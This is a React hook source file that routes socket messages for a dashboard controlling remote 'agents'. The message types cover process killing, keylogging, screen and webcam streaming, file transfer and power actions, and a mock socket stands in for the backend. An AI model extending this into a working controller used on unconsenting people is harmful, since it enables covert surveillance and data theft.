// UseAgentSocket.js — glue layer between the socket service and Zustand stores.
// Components must NEVER import MockSocket or Socket directly; they use this hook.
// Swapping MockSocket for Socket only requires changing the one import below.
import { useEffect, useRef } from 'react'

import MockSocket                        from '../services/MockSocket'   // TODO: swap to Socket.js when backend is ready
import { buildListAgents, MSG_TYPE }     from '../services/Protocol'
import useConnectionStore                from '../store/ConnectionStore'
import useAgentStore                     from '../store/AgentStore'
import useModuleStore                    from '../store/ModuleStore'

export default function useAgentSocket()
{
    const socket_ref = useRef(null)   // holds the active socket instance

    // Pull only the setters we need — no derived state, so no extra re-renders.
    const { setStatus }                   = useConnectionStore()
    const { setAgents }                   = useAgentStore()
    const { setModuleData, appendKeylog } = useModuleStore()

    useEffect(function ()
    {
        const socket = new MockSocket()
        socket_ref.current = socket

        socket.onOpen(function ()
        {
            setStatus('open')
            // immediately request the agent list after the connection is ready
            socket.send(buildListAgents())
        })

        socket.onMessage(function (msg)
        {
            dispatchMessage(msg)
        })

        socket.onClose(function ()
        {
            setStatus('closed')
        })

        socket.onError(function ()
        {
            setStatus('closed')
        })

        socket.connect()

        // clean up the socket when the component that owns this hook unmounts
        return function ()
        {
            socket.close()
            socket_ref.current = null
        }
    }, [])   // run once on mount

    // Route an incoming message object to the correct store action.
    function dispatchMessage(msg)
    {
        switch (msg.type)
        {
            case MSG_TYPE.AGENTS_LIST:
                setAgents(msg.agents)
                break

            case MSG_TYPE.AGENT_STATUS:
                // TODO: update a single agent's online flag when agents_list is gone
                break

            case MSG_TYPE.APP_LIST_RESULT:
                setModuleData(msg.agent_id, 'app', msg.apps)
                break

            case MSG_TYPE.APP_ACTION_RESULT:
                // TODO: surface action feedback (toast / status in AppModule)
                break

            case MSG_TYPE.PROC_LIST_RESULT:
                setModuleData(msg.agent_id, 'process', msg.processes)
                break

            case MSG_TYPE.PROC_KILL_RESULT:
                // TODO: surface kill feedback
                break

            case MSG_TYPE.KEYLOG:
                appendKeylog(msg.agent_id, msg.events)
                break

            case MSG_TYPE.KEYLOG_STARTED:
            case MSG_TYPE.KEYLOG_STOPPED:
            case MSG_TYPE.KEYLOG_DENIED:
                // TODO: update keylog active-state flag in ModuleStore
                break

            case MSG_TYPE.STREAM_STARTED:
            case MSG_TYPE.STREAM_STOPPED:
                // TODO: update screen streaming flag in ModuleStore
                break

            case MSG_TYPE.WEBCAM_STARTED:
            case MSG_TYPE.WEBCAM_STOPPED:
            case MSG_TYPE.WEBCAM_DENIED:
                // TODO: update webcam active-state flag in ModuleStore
                break

            case MSG_TYPE.FRAME_META:
                // binary frame arrives on the next message — handled by FrameCanvas
                break

            case MSG_TYPE.FS_LIST_RESULT:
                setModuleData(msg.agent_id, 'file', { entries: msg.entries, path: msg.path })
                break

            case MSG_TYPE.FS_GET_RESULT:
                // TODO: forward to FileModule download handler
                break

            case MSG_TYPE.FS_PUT_RESULT:
            case MSG_TYPE.FS_PUT_COMPLETE:
                // TODO: forward progress to FileModule upload handler
                break

            case MSG_TYPE.FS_ERROR:
                // TODO: surface file error to FileModule
                break

            case MSG_TYPE.POWER_RESULT:
                // TODO: surface power action confirmation / error
                break

            // TODO: add binary frame dispatch (ArrayBuffer path) here

            default:
                console.warn('[useAgentSocket] unhandled message type:', msg.type)
        }
    }

    // Send a pre-built JSON string to the socket.
    // Call this from modules after building the message with Protocol.js helpers.
    function sendCommand(json_string)
    {
        if (socket_ref.current)
        {
            socket_ref.current.send(json_string)
        }
        else
        {
            console.warn('[useAgentSocket] sendCommand called before socket is ready')
        }
    }

    return { sendCommand }
}
